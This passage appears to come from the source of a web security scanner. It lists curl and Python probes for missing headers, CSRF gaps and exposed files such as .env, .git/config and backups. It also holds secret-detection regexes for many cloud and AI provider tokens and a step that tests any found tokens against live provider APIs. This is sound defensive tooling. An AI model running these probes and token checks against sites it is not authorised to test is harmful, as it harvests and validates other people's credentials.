    if 'application/javascript' in v.lower() and 'x-content-type-options' not in h.lower():
        print('MIME_SNIFF_JS: JavaScript served without nosniff protection')
else:
    print('CONTENT_TYPE_MISSING: no Content-Type header')
# X-Content-Type-Options check
if 'x-content-type-options' not in h.lower():
    print('XCTO_MISSING: X-Content-Type-Options nosniff absent — MIME confusion attacks possible')
elif 'nosniff' not in h.lower():
    print('XCTO_NOT_NOSNIFF: X-Content-Type-Options present but not set to nosniff')
" 2>/dev/null""",
            "Content-Type and charset analysis — MIME confusion, charset sniffing"
        ),
        # 11: HTTP methods + TRACE/TRACK
        (
            "echo '=OPTIONS='; "
            "curl -sI -X OPTIONS -A 'Mozilla/5.0' --max-time 8 {target} 2>/dev/null | grep -i 'allow:'; "
            "echo '=TRACE='; "
            "curl -si -X TRACE -A 'Mozilla/5.0' --max-time 8 {target} 2>/dev/null | head -5; "
            "echo '=PUT_405='; "
            "curl -so /dev/null -w '%{http_code}' -X PUT -A 'Mozilla/5.0' --max-time 8 {target} 2>/dev/null; "
            "echo '=DELETE_405='; "
            "curl -so /dev/null -w '%{http_code}' -X DELETE -A 'Mozilla/5.0' --max-time 8 {target} 2>/dev/null",
            "HTTP methods test — OPTIONS allowed, TRACE echo, PUT/DELETE response codes"
        ),
        # 12: Forms analysis — CSRF tokens, autocomplete, password in GET
        (
            r"""python3 - <<'PYEOF'
import re, os, subprocess
body = open('/tmp/ps_body.html').read() if os.path.exists('/tmp/ps_body.html') else ''
if not body:
    body = subprocess.run(['curl','-sL','-A','Mozilla/5.0','--max-time','12','{target}'],
                          capture_output=True, text=True).stdout[:100000]
forms = re.findall(r'<form[^>]*>.*?</form>', body, re.I | re.S)
print(f"FORMS_FOUND: {len(forms)}")
for i, form in enumerate(forms[:10]):
    method = (re.search(r'method=["\']?(\w+)', form, re.I) or type('',(),{'group':lambda s,n:'GET'})()).group(1).upper()
    action = (re.search(r'action=["\']([^"\']+)', form, re.I) or type('',(),{'group':lambda s,n:''})()).group(1)
    has_csrf = bool(re.search(r'(?i)(?:csrf|_token|authenticity_token|__RequestVerificationToken|nonce)', form))
    has_file = bool(re.search(r'type=["\']?file', form, re.I))
    autocomplete_off = 'autocomplete' in form.lower() and 'off' in form.lower()
    # Only flag password fields that have a name= attribute and are not disabled —
    # nameless/disabled inputs are never submitted with the form (no URL exposure risk)
    has_named_pass = False
    for inp in re.finditer(r'<input([^>]+)>', form, re.I):
        a = inp.group(1)
        if not re.search(r'type=["\']?password', a, re.I): continue
        if re.search(r'\bdisabled\b', a, re.I): continue
        if not re.search(r'\bname=["\']?[^"\'>\s]+', a, re.I): continue
        has_named_pass = True
        break
    print(f"FORM_{i+1}: method={method} action={action[:60]}")
    if has_named_pass and not has_csrf:
        print(f"  FORM_NO_CSRF: password form missing CSRF token")
    if has_named_pass and method == 'GET':
        print(f"  FORM_PASSWORD_IN_GET: password submitted via GET — visible in logs/history")
    if has_named_pass and not autocomplete_off:
        print(f"  FORM_AUTOCOMPLETE: password field missing autocomplete=off")
    if has_file:
        print(f"  FORM_FILE_UPLOAD: file upload form detected")
    if not has_csrf and method == 'POST':
        print(f"  FORM_NO_CSRF_POST: POST form without CSRF token")
PYEOF""",
            "Forms audit — CSRF tokens, password-in-GET, autocomplete, file upload"
        ),
        # 13: Source map exposure + version strings in HTML
        (
            "curl -sI --max-time 8 {target}/main.js {target}/app.js {target}/bundle.js 2>/dev/null | "
            "grep -i 'x-sourcemap\\|sourcemap\\|content-type'; "
            "echo '---'; "
            r"""curl -sL --max-time 10 {target} 2>/dev/null | python3 -c "
import sys, re
h = sys.stdin.read()
# Source map references in JS
for m in re.findall(r'//# sourceMappingURL=([^\s]+\.map)', h): print(f'SOURCE_MAP_URL: {m[:100]}')
# Generator meta tags
for m in re.findall(r'<meta[^>]*name=[\"\'?]generator[\"\'?][^>]*content=[\"\'?]([^\"\'<>]+)', h, re.I):
    print(f'GENERATOR_META: {m[:80]}')
# Framework version in HTML
for pat in [r'jquery[\s/v]+([\d.]+)', r'bootstrap[\s/v]+([\d.]+)', r'WordPress\s+([\d.]+)',
            r'Drupal\s+([\d.]+)', r'next\.js\s+([\d.]+)', r'react\s+([\d.]+)']:
    m = re.search(pat, h, re.I)
    if m: print(f'VERSION_STRING: {m.group(0)[:60]}')
# data-* attributes that may reveal internals
for m in re.findall(r'data-(?:env|environment|version|build|commit|deploy)\s*=\s*[\"\'?]([^\"\'<>]+)', h, re.I)[:5]:
    print(f'DATA_ATTR_DISCLOSURE: {m[:60]}')
" 2>/dev/null""",
            "Source maps, generator meta, version strings, data-* attribute disclosure"
        ),
        # 14: Redirect chain + mixed content + subresource integrity
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, os
# Follow redirect chain, show each hop
chain = subprocess.run(
    ['curl','-sIL','-A','Mozilla/5.0','--max-time','15','--max-redirs','10','-w','%{num_redirects}','{target}'],
    capture_output=True, text=True)
hops = re.findall(r'(?i)location:\s*([^\r\n]+)', chain.stdout)
print(f"REDIRECT_CHAIN: {len(hops)} redirect(s)")
for h in hops: print(f"  -> {h.strip()[:100]}")
# Check for HTTP→HTTPS downgrade
final_url = '{target}'
for h in hops: final_url = h.strip()
if final_url.startswith('http://'):
    print("REDIRECT_TO_HTTP: final redirect destination is HTTP — MITM possible")
# Subresource Integrity check on external scripts/styles
body = open('/tmp/ps_body.html').read() if os.path.exists('/tmp/ps_body.html') else ''
ext_res = re.findall(r'<(?:script|link)[^>]+(?:src|href)=["\']https?://(?!{host})[^"\']+["\'][^>]*>', body, re.I)
no_sri  = [r for r in ext_res if 'integrity=' not in r.lower()]
print(f"EXTERNAL_RESOURCES: {len(ext_res)} external, {len(no_sri)} missing SRI")
for r in no_sri[:5]:
    u = re.search(r'(?:src|href)=["\']([^"\']+)["\']', r, re.I)
    if u: print(f"  NO_SRI: {u.group(1)[:80]}")
# Mixed content — HTTP resources on HTTPS page
if '{target}'.startswith('https'):
    mixed = re.findall(r'(?:src|href|action)=["\']http://[^"\']+["\']', body, re.I)
    if mixed: print(f"MIXED_CONTENT: {len(mixed)} HTTP resource(s) on HTTPS page")
    for m in mixed[:3]: print(f"  {m[:80]}")
PYEOF""",
            "Redirect chain, HTTP downgrade, subresource integrity, mixed content"
        ),
        # 15: Sensitive file exposure + backup files
        (
            "for f in .DS_Store .htaccess .htpasswd web.config .svn/entries "
            "crossdomain.xml clientaccesspolicy.xml WEB-INF/web.xml "
            "package.json composer.json Gemfile requirements.txt "
            "*.bak *.old *.orig *.backup *.swp "
            "CHANGELOG.md RELEASE.md VERSION README.md; do "
            "  info=$(curl -sI --max-time 5 {target}/$f 2>/dev/null); "
            "  code=$(echo \"$info\" | grep -m1 '^HTTP/' | awk '{print $2}'); "
            "  ct=$(echo \"$info\" | grep -i '^content-type:' | head -1); "
            "  [ \"$code\" = '200' ] && echo \"$ct\" | grep -qiv 'text/html' "
            "    && echo \"EXPOSED_FILE_200: {target}/$f\"; "
            "  [ \"$code\" = '403' ] && echo \"EXPOSED_FILE_403: {target}/$f (forbidden but exists)\"; "
            "done",
            "Sensitive file exposure — .htaccess, web.config, backups, package manifests"
        ),
    ],
    "Secrets Scanner": [
        # ── CMD 1: Comprehensive secret file exposure probe (40+ paths) ─────
        (
            r"""python3 - <<'PYEOF'
import subprocess, sys
PATHS = [
    '.env','.env.local','.env.dev','.env.development','.env.prod','.env.production',
    '.env.staging','.env.backup','.env.bak','.env.old','.env.example','.env.test',
    '.git/config','.git/HEAD','.git/COMMIT_EDITMSG',
    'config.js','config.json','config.yml','config.yaml','config.php','config.py',
    'settings.py','settings.json','settings.local.js','local_settings.py',
    'application.properties','application.yml','application.yaml',
    'secrets.yml','secrets.json','credentials.json','credentials.yml',
    'docker-compose.yml','docker-compose.yaml',
    '.npmrc','.pypirc','.netrc','.boto',
    'wp-config.php','wp-config.php.bak','LocalSettings.php','configuration.php',
    'database.yml','database.json','db.config.js',
    'firebase.json','.firebaserc','firebaseConfig.js',
    'terraform.tfvars','terraform.tfstate',
    'composer.json','Makefile','Dockerfile',
    'config/database.yml','config/secrets.yml','config/credentials.yml',
    'app/config/parameters.yml','config/app.php',
]
base = '{target}'.rstrip('/')
found = 0
for path in PATHS:
    try:
        r = subprocess.run(
            ['curl','-s','--max-time','5','-w','\n__STATUS__:%{http_code}__CT__:%{content_type}',
             f'{base}/{path}'],
            capture_output=True,text=True)
        raw = r.stdout
        # Parse status and content-type appended by -w
        import re as _re
        m = _re.search(r'__STATUS__:(\d+)__CT__:([^\s]*)', raw)
        status = int(m.group(1)) if m else 0
        ct = (m.group(2) if m else '').lower()
        body = raw[:raw.find('__STATUS__')].strip() if '__STATUS__' in raw else raw.strip()
        # Only flag real 200s with non-HTML, non-empty content
        is_html = 'text/html' in ct or body.lower().lstrip().startswith(('<!doctype','<html'))
        if status == 200 and body and len(body) > 10 and not is_html:
            snippet = body[:200].replace('\n',' ')
            print(f"FILE_EXPOSED:{path}: {snippet}")
            found += 1
    except Exception:
        pass
    try:
        r2 = subprocess.run(['curl','-sIo','/dev/null','-w','%{{http_code}}','--max-time','5',f'{base}/{path}'],
                           capture_output=True,text=True)
        if r2.stdout.strip()=='403':
            print(f"FILE_FORBIDDEN:{path}: 403 response suggests file exists but access restricted")
    except Exception:
        pass
print(f"FILE_PROBE_DONE: scanned {len(PATHS)} paths, {found} accessible")
PYEOF""",
            "Secret file probe — .env, git config, credentials, infra configs (40+ paths)"
        ),
        # ── CMD 2: Provider-specific token scan + b64 decode + entropy gate ──
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, base64, math, json, os
base = '{target}'.rstrip('/')

def ent(s):
    if not s: return 0.0
    f = {}
    for c in s: f[c] = f.get(c,0)+1
    n = len(s)
    return -sum((v/n)*math.log2(v/n) for v in f.values())

def entropy_ok(val):
    # Per-charset entropy thresholds - calibrated to real secret distributions.
    if not val or len(val) < 8: return False
    chars = set(val)
    e = ent(val)
    if chars <= set('0123456789abcdefABCDEF'):   return e > 3.0   # hex
    if chars <= set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='):
        return e > 4.5                                              # base64 (64-char alphabet)
    return e > 3.5                                                  # mixed alphanumeric

def is_placeholder(val):
    return bool(re.match(
        r'^(?:xxx+|your[-_]|<[^>]+>|\*+|changeme|example|placeholder|none|null'
        r'|undefined|false|true|test|dummy|sample|foo|bar|baz|MY_|YOUR_'
        r'|REPLACE_ME|INSERT_|0{8,}|1{8,}|__\w+__|process\.env\.|ENV\[)',
        val, re.I))

def is_template(val, body):
    # True if value prefix repeats 4+ times — likely documentation or template
    prefix = val[:min(len(val), 16)]
    return body.count(prefix) >= 4

# Fetch homepage + JS
body = subprocess.run(['curl','-sL','-A','Mozilla/5.0','--max-time','12',base],
                      capture_output=True, text=True).stdout[:300000]
js_srcs = list(set(re.findall(r'src=["\']([^"\']+\.js(?:[^"\']*)?)["\']',body,re.I)))[:4]
for src in js_srcs:
    url = src if src.startswith('http') else base+'/'+src.lstrip('/')
    body += subprocess.run(['curl','-sL','--max-time','10',url],
                           capture_output=True,text=True).stdout[:200000]

# ── TruffleHog decoder pipeline: plain → base64 → scan decoded content ────
decoded_extra = ''
for b64m in re.finditer(r'[A-Za-z0-9+/]{40,}={0,2}', body):
    try:
        decoded = base64.b64decode(b64m.group(0) + '==').decode('utf-8','replace')
        if re.search(r'(?:key|secret|token|password|AKIA|ghp_|sk_live_)', decoded, re.I):
            decoded_extra += '\n' + decoded
    except Exception:
        pass
scan_body = body + decoded_extra

TOKEN_PATTERNS = [
    (r'\bAKIA[A-Z0-9]{16}\b',                                       'AWS_ACCESS_KEY',     False),
    (r'(?<![A-Za-z0-9/+])[A-Za-z0-9/+]{40}(?![A-Za-z0-9/+])',      'AWS_SECRET_CAND',    True),
    (r'\bAIza[0-9A-Za-z_\-]{35}\b',                                  'GOOGLE_API_KEY',     False),
    (r'\bgh[pousr]_[A-Za-z0-9_]{36,255}\b',                         'GITHUB_TOKEN',        False),
    (r'\bgithub_pat_[A-Za-z0-9_]{82}\b',                            'GITHUB_FINE_TOKEN',   False),
    (r'\bsk_live_[A-Za-z0-9]{24,}\b',                               'STRIPE_LIVE_KEY',     False),
    (r'\brk_live_[A-Za-z0-9]{24,}\b',                               'STRIPE_RESTRICTED',   False),
    (r'\bxox[baprs]-[0-9]{10,}-[0-9]{10,}-[A-Za-z0-9]{24,}\b',     'SLACK_TOKEN',         False),
    (r'\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b',            'SENDGRID_KEY',        False),
    (r'\bAC[a-f0-9]{32}\b',                                          'TWILIO_SID',          False),
    (r'\bSK[a-f0-9]{32}\b',                                          'TWILIO_AUTH_TOKEN',   False),
    (r'\bsq0[a-z]{3}-[A-Za-z0-9\-_]{22,43}\b',                     'SQUARE_TOKEN',        False),
    (r'\bsk-[A-Za-z0-9]{48,}\b',                                     'OPENAI_KEY',          False),
    (r'\bsk-ant-api03-[A-Za-z0-9\-_]{93}\b',                        'ANTHROPIC_KEY',       False),
    (r'\bhf_[A-Za-z0-9]{34}\b',                                      'HUGGINGFACE_TOKEN',   False),
    (r'\bEY[A-Za-z0-9_\-]{32,}\b',                                   'ELEVENLABS_KEY',      True),
    (r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',      'PRIVATE_KEY_PEM',     False),
    (r'\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{0,}\b','JWT_TOKEN', False),
    (r'(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp[s]?)://[^\s"\'<>]{12,}','DB_CONN_STRING',False),
    (r'cloudinary://[0-9]+:[A-Za-z0-9@_\-]+@[A-Za-z0-9]+',         'CLOUDINARY_URL',      False),
    (r'\bya29\.[A-Za-z0-9_\-]{50,}\b',                              'GOOGLE_OAUTH_TOKEN',  False),
    (r'(?i)\bkey-[0-9a-f]{32}\b',                                    'MAILGUN_KEY',         False),
    (r'(?i)(?:APP_KEY|SECRET_KEY)\s*[=:]\s*["\']?[A-Za-z0-9+/=_\-]{32,}','APP_SECRET',    True),
    (r'\bapat_[A-Za-z0-9]{32}\b',                                    'ASANA_PAT',           False),
    (r'\bdop_v1_[A-Za-z0-9]{64}\b',                                  'DIGITALOCEAN_TOKEN',  False),
    (r'\bglpat-[A-Za-z0-9_\-]{20}\b',                               'GITLAB_PAT',          False),
    (r'\bnp_[A-Za-z0-9]{32}\b',                                      'NETLIFY_TOKEN',       False),
]

found_tokens = []
seen_values  = set()  # deduplication across patterns

for pat, label, needs_entropy in TOKEN_PATTERNS:
    for m in re.finditer(pat, scan_body):
        val = m.group(0)
        # Skip duplicates
        vkey = val[:24]
        if vkey in seen_values: continue
        # AWS_SECRET_CAND: only flag if near an AWS key variable
        if label == 'AWS_SECRET_CAND':
            ctx = scan_body[max(0,m.start()-60):m.start()+60]
            if not re.search(r'(?i)aws_secret|secret_access_key', ctx): continue
        # Placeholder check
        if is_placeholder(val): continue
        # Entropy gate (for patterns that need it)
        if needs_entropy and not entropy_ok(val): continue
        # Frequency check — if value prefix repeats 4+ times it is likely a template
        if is_template(val, body):
            print(f"TOKEN_TEMPLATE:{label}: prefix repeats 4+ times — likely docs/placeholder: {val[:40]}")
            continue
        seen_values.add(vkey)
        found_tokens.append({'label': label, 'value': val[:120]})
        print(f"TOKEN_FOUND:{label}: {val[:80]}")
        break  # one instance per pattern type

# Persist for CMD 7 verification
try:
    with open('/tmp/dast_ss_tokens.json','w') as f:
        json.dump(found_tokens, f)
except Exception:
    pass

if not found_tokens:
    print("TOKEN_SCAN_CLEAN: no provider-specific tokens in homepage/JS (including base64-decoded content)")
else:
    print(f"TOKEN_SCAN_DONE: {len(found_tokens)} potential secret(s) found — CMD 7 will verify live status")
PYEOF""",
            "Provider-specific token scan + TruffleHog b64 decode pass + entropy gate + dedup + frequency filter"
        ),
        # ── CMD 3: Entropy-gated keyword scan (Xkeys + FP reduction) ─────────
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, math, json, os
base = '{target}'.rstrip('/')

def ent(s):
    if not s: return 0.0
    f = {}
    for c in s: f[c] = f.get(c,0)+1
    n = len(s)
    return -sum((v/n)*math.log2(v/n) for v in f.values())

def charset_threshold(val):
    # Calibrated entropy floor per alphabet size.
    if re.match(r'^[0-9a-fA-F]+$', val):      return 3.0  # hex (16-char set)
    if re.match(r'^[A-Za-z0-9+/=]+$', val) and len(val) >= 24:
        return 4.2   # base64 (64-char set) — real secrets cluster >4.5
    if re.match(r'^[A-Za-z0-9_\-]+$', val):   return 3.2  # url-safe alphanum
    return 3.0       # mixed (punctuation lowers threshold)

PLACEHOLDER_RE = re.compile(
    r'^(?:xxx+|your[-_]|<[^>]+>|\*{3,}|changeme|example|placeholder|none|null'
    r'|undefined|false|true|test[-_]?(?:key|token|secret)?|dummy|sample'
    r'|foo|bar|baz|MY_\w+|YOUR_\w+|REPLACE|INSERT|ENTER|GOES_HERE'
    r'|0{6,}|1{6,}|a{6,}|__\w+__|process\.env\.|ENV\[|config\[)',
    re.I)

body = subprocess.run(['curl','-sL','-A','Mozilla/5.0','--max-time','12',base],
                      capture_output=True,text=True).stdout[:300000]
js_srcs = list(set(re.findall(r'src=["\']([^"\']+\.js(?:[^"\']*)?)["\']',body,re.I)))[:3]
for src in js_srcs:
    url = src if src.startswith('http') else base+'/'+src.lstrip('/')
    body += subprocess.run(['curl','-sL','--max-time','8',url],
                           capture_output=True,text=True).stdout[:100000]

# Load already-found tokens from CMD 2 to skip duplicates
seen_values = set()
try:
    for tok in json.load(open('/tmp/dast_ss_tokens.json')):
        seen_values.add(tok.get('value','')[:24])
except Exception:
    pass

# Xkeys-style keyword list — 50 keywords covering all major providers
KEYWORDS = [
    'aws_access_key_id','aws_secret_access_key','aws_secret_key','aws_session_token',
    'api_key','api_secret','apikey','app_key','app_secret','client_secret','consumer_secret',
    'access_token','oauth_token','oauth_secret','bearer_token',
    'jwt_secret','jwt_signing_key','private_key','secret_key','secret_token','auth_token',
    'stripe_key','stripe_secret','stripe_publishable_key',
    'twilio_auth_token','twilio_account_sid',
    'sendgrid_api_key','mailgun_api_key','mailgun_key',
    'slack_token','slack_bot_token','slack_signing_secret','slack_webhook_url',
    'github_token','github_personal_access_token','heroku_api_key',
    'database_password','db_password','db_pass','mysql_password','postgres_password',
    'redis_password','mongo_password','mongodb_password',
    'facebook_app_secret','fb_app_secret',
    'google_oauth_client_secret','google_api_key','google_cloud_key',
    'twitter_consumer_secret','twitter_api_secret',
    'cloudinary_api_secret','cloudinary_api_key',
    'firebase_api_key','firebase_secret',
    'sentry_dsn','datadog_api_key','newrelic_license_key',
    'encryption_key','hash_key','hash_secret','signing_secret','webhook_secret',
    'ssh_private_key','pgp_private_key','certificate_key','ssl_key',
    'paypal_client_secret','braintree_private_key',
    'shopify_api_key','shopify_api_secret',
]

found_keys = []
kw_tokens   = []

for kw in KEYWORDS:
    pat = rf'(?i){re.escape(kw)}\s*(?:[=:>]+)\s*["\']?([^\s"\'<>&\n\r]{{8,100}})["\']?'
    m = re.search(pat, body)
    if not m: continue
    val = m.group(1).rstrip(',.;)')

    # 1. Placeholder filter (extended)
    if PLACEHOLDER_RE.match(val): continue

    # 2. Entropy gate — per-charset calibrated
    e = ent(val)
    thr = charset_threshold(val)
    if e < thr:
        print(f"KEYWORD_LOW_ENT:{kw.upper()}: entropy={e:.2f}<{thr:.1f} — likely FP: {val[:40]}")
        continue

    # 3. Frequency check — template/docs repeat the same value many times
    if body.count(val[:min(len(val),16)]) >= 4:
        print(f"KEYWORD_TEMPLATE:{kw.upper()}: value repeats 4+ times — docs/placeholder: {val[:40]}")
        continue

    # 4. Dedup against CMD 2 findings
    if val[:24] in seen_values: continue

    seen_values.add(val[:24])
    print(f"KEYWORD_SECRET:{kw.upper()}: entropy={e:.2f} — {val[:60]}")
    found_keys.append(kw)
    kw_tokens.append({'label': f'KW_{kw.upper()}', 'value': val[:120], 'source': 'keyword'})

# Append to token file so CMD 7 can attempt verification too
try:
    existing = json.load(open('/tmp/dast_ss_tokens.json')) if os.path.exists('/tmp/dast_ss_tokens.json') else []
    with open('/tmp/dast_ss_tokens.json','w') as f:
        json.dump(existing + kw_tokens, f)
except Exception:
    pass

if not found_keys:
    print("KEYWORD_SCAN_CLEAN: no keyword-matched secrets passed entropy + dedup filters")
else:
    print(f"KEYWORD_TOTAL: {len(found_keys)} validated keyword secret(s)")
PYEOF""",
            "Entropy-gated keyword scan — per-charset thresholds, placeholder filter, frequency dedup, CMD2 dedup"
        ),
        # ── CMD 4: Backup + debug file + source map probe ──────────────────
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
base = '{target}'.rstrip('/')
BACKUP_PATHS = [
    '.env.bak','.env~','.env.old','.env.orig','config.php.bak','config.php~',
    'config.js.bak','settings.py.bak','application.properties.bak',
    'database.yml.bak','wp-config.php.bak','config.bak','backup.sql','db.sql','dump.sql',
    'site.tar.gz','backup.zip','www.zip','site.zip','files.tar.gz','database.sql.gz',
    '.DS_Store','Thumbs.db','desktop.ini',
    'config.js.map','main.js.map','app.js.map','bundle.js.map',
    '.git/refs/heads/main','.git/refs/heads/master','.svn/entries',
    'phpinfo.php','info.php','test.php','debug.php',
    'actuator','actuator/env','actuator/mappings','actuator/health',
    'console','django-admin','__debug__','.well-known/security.txt',
    'server-status','server-info',
]
DEBUG_ENDPOINTS = [
    '/actuator/env','/actuator/configprops','/actuator/heapdump',
    '/metrics','/debug','/console','/phpinfo.php','/server-status',
    '/__debug__','/api/debug','/v1/debug',
]
found = 0
for path in BACKUP_PATHS:
    try:
        r = subprocess.run(['curl','-so','/dev/null','-w','%{http_code}','--max-time','5',f'{base}/{path}'],
                          capture_output=True,text=True)
        code = r.stdout.strip()
        if code in ('200','206'):
            body = subprocess.run(['curl','-sf','--max-time','5',f'{base}/{path}'],capture_output=True,text=True).stdout[:300]
            print(f"BACKUP_EXPOSED:{path}: HTTP {code} — {body[:150].replace(chr(10),' ')}")
            found += 1
        elif code=='403':
            print(f"BACKUP_FORBIDDEN:{path}: 403 — file exists but blocked")
    except Exception:
        pass
for ep in DEBUG_ENDPOINTS:
    try:
        r = subprocess.run(['curl','-so','/dev/null','-w','%{http_code}','--max-time','5',f'{base}{ep}'],
                          capture_output=True,text=True)
        code = r.stdout.strip()
        if code=='200':
            body = subprocess.run(['curl','-sf','--max-time','5',f'{base}{ep}'],capture_output=True,text=True).stdout[:500]
            if any(kw in body.lower() for kw in ['password','secret','key','token','credential','env','jdbc']):
                print(f"DEBUG_SECRETS:{ep}: HTTP 200 — secrets visible in debug output")
            else:
                print(f"DEBUG_OPEN:{ep}: HTTP 200 — debug endpoint accessible")
    except Exception:
        pass
print(f"BACKUP_PROBE_DONE: scanned {len(BACKUP_PATHS)} backup/debug paths, {found} exposed")
PYEOF""",
            "Backup file + debug endpoint probe — .bak, .sql, source maps, actuator, phpinfo, svn/git refs"
        ),
        # ── CMD 5: Response headers + cookie secrets scan ──────────────────
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
base = '{target}'.rstrip('/')
headers_raw = subprocess.run(['curl','-sIL','-A','Mozilla/5.0','--max-time','10',base],
                             capture_output=True,text=True).stdout
# Check for secrets in response headers (rare but real)
HEADER_PATTERNS = [
    (r'X-Api-Key:\s*\S{16,}',          'API_KEY_IN_HEADER'),
    (r'X-Auth-Token:\s*\S{16,}',       'AUTH_TOKEN_IN_HEADER'),
    (r'Authorization:\s*\S{20,}',      'AUTH_HEADER_IN_RESPONSE'),
    (r'Set-Cookie:.*(?:token|session|auth|jwt)=[A-Za-z0-9_\-\.]{20,}', 'SESSION_TOKEN_IN_COOKIE'),
    (r'X-Debug-Token(?:-Link)?:\s*\S+','SYMFONY_DEBUG_TOKEN'),
    (r'X-Powered-By:\s*(?:PHP|ASP\.NET|Express)[^\r\n]*','SERVER_VERSION_DISCLOSURE'),
    (r'Server:\s*(?:Apache|nginx|IIS|Tomcat|Jetty)[^\r\n/]*/([0-9.]+)','SERVER_VERSION_NUMBERED'),
    (r'X-Generator:\s*\S[^\r\n]+',     'GENERATOR_DISCLOSURE'),
    (r'X-AspNet-Version:\s*\S+',       'ASPNET_VERSION'),
    (r'X-Runtime:\s*[0-9.]+',          'RUBY_RUNTIME_HEADER'),
]
found = []
for pat, label in HEADER_PATTERNS:
    m = re.search(pat, headers_raw, re.I)
    if m:
        print(f"HEADER_SECRET:{label}: {m.group(0)[:100]}")
        found.append(label)
# Check Set-Cookie for token values
cookies = re.findall(r'Set-Cookie:\s*([^\r\n]+)',headers_raw,re.I)
for ck in cookies:
    name = ck.split('=')[0].strip().lower()
    if any(k in name for k in ['session','sess','auth','token','jwt','sid']):
        httponly = 'httponly' in ck.lower()
        secure   = 'secure' in ck.lower()
        samesite = 'samesite' in ck.lower()
        flags = []
        if not httponly: flags.append('missing HttpOnly')
        if not secure:   flags.append('missing Secure')
        if not samesite: flags.append('missing SameSite')
        if flags:
            print(f"COOKIE_FLAGS:{name}: {', '.join(flags)}")
if not found:
    print("HEADER_SCAN_CLEAN: no secrets detected in response headers")
PYEOF""",
            "Response header secret scan — X-Api-Key, auth tokens in headers, debug tokens, cookie security flags"
        ),
        # ── CMD 6: GitHub-style secret scanning — entropy + pattern hybrid ─
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, math
base = '{target}'.rstrip('/')
body = subprocess.run(['curl','-sL','-A','Mozilla/5.0','--max-time','12',base],
                     capture_output=True,text=True).stdout[:200000]
# Fetch one more JS file if present
js_srcs = list(set(re.findall(r'src=["\']([^"\']+\.js(?:[^"\']*)?)["\']',body,re.I)))[:2]
for src in js_srcs:
    url = src if src.startswith('http') else base+'/'+src.lstrip('/')
    body += subprocess.run(['curl','-sL','--max-time','8',url],capture_output=True,text=True).stdout[:100000]

def entropy(s):
    if not s: return 0
    freq = {}
    for c in s: freq[c] = freq.get(c,0)+1
    return -sum((f/len(s))*math.log2(f/len(s)) for f in freq.values())

# High-entropy string detection (TruffleHog approach) — flag strings >4.0 bits/char
# near secret-looking variable names
SECRET_CTX = re.compile(
    r'(?i)(?:key|secret|token|password|passwd|credential|auth|apikey|api_key|private|signing)\s*[=:]\s*["\']?([A-Za-z0-9+/=_\-]{20,80})["\']?',
)
for m in SECRET_CTX.finditer(body):
    val = m.group(1)
    ent = entropy(val)
    if ent > 3.5 and not re.match(r'^(?:xxxx|your|change|example|placeholder|\*+)',val,re.I):
        print(f"HIGH_ENTROPY_SECRET: entropy={ent:.2f} near '{m.group(0)[:60]}'")

# PII patterns — email/phone in source
emails = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',body)
internal = [e for e in emails if not any(d in e for d in ['example','test','noreply','no-reply','placeholder','yourdomain'])]
if internal: print(f"EMAIL_IN_SOURCE: {len(internal)} email(s) — e.g. {internal[0][:50]}")

# Source map references (exposes original source paths)
if re.search(r'//# sourceMappingURL=',body):
    print("SOURCE_MAP_REFERENCED: JS source maps referenced — original source paths may be accessible")

# Webpack chunk exposure
if re.search(r'webpackChunkName|__webpack_require__',body):
    print("WEBPACK_EXPOSED: Webpack internals visible — may expose module structure in source")

# Internal IP addresses in source
ips = re.findall(r'\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b',body)
if ips: print(f"INTERNAL_IP_IN_SOURCE: {len(set(ips))} internal IP(s) — e.g. {ips[0]}")

# GraphQL/REST API tokens in hidden fields
hidden = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']{10,})["\']',body,re.I)
for h in hidden[:3]:
    ent = entropy(h)
    if ent > 3.5:
        print(f"HIDDEN_FIELD_SECRET: high-entropy hidden input value (entropy={ent:.2f}): {h[:50]}")
PYEOF""",
            "Entropy + PII scan — high-entropy secret detection, email PII, source maps, internal IPs, hidden field secrets"
        ),
        # ── CMD 7: Live API verification (TruffleHog --only-verified approach) ─
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, json, os
# Read token list written by CMD 2 + CMD 3
tokens = []
try:
    tokens = json.load(open('/tmp/dast_ss_tokens.json'))
except Exception:
    pass
if not tokens:
    print("VERIFY_SKIP: no tokens from earlier commands to verify")
    exit()
print(f"VERIFY_START: verifying {len(tokens)} token(s) against live APIs")

def curl_check(cmd, success_fn):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return success_fn(r)
    except Exception:
        return None  # network error / timeout = inconclusive

# Verifier table — provider label → (curl args fn, success predicate)
VERIFIERS = {
    'GITHUB_TOKEN':      (lambda v: ['curl','-sf','-H',f'Authorization: token {v}',
                                     '-H','User-Agent: Mozilla/5.0','https://api.github.com/user'],
                          lambda r: r.returncode==0 and '"login"' in r.stdout),
    'GITHUB_FINE_TOKEN': (lambda v: ['curl','-sf','-H',f'Authorization: Bearer {v}',
                                     '-H','User-Agent: Mozilla/5.0','https://api.github.com/user'],
                          lambda r: r.returncode==0 and '"login"' in r.stdout),
    'STRIPE_LIVE_KEY':   (lambda v: ['curl','-sf','https://api.stripe.com/v1/account','-u',f'{v}:'],
                          lambda r: r.returncode==0 and '"id"' in r.stdout),
    'STRIPE_RESTRICTED': (lambda v: ['curl','-sf','https://api.stripe.com/v1/account','-u',f'{v}:'],
                          lambda r: r.returncode==0 and '"id"' in r.stdout),
    'OPENAI_KEY':        (lambda v: ['curl','-sf','-H',f'Authorization: Bearer {v}',
                                     'https://api.openai.com/v1/models'],
                          lambda r: r.returncode==0 and '"data"' in r.stdout),
    'SLACK_TOKEN':       (lambda v: ['curl','-sf','-X','POST','-d',f'token={v}',
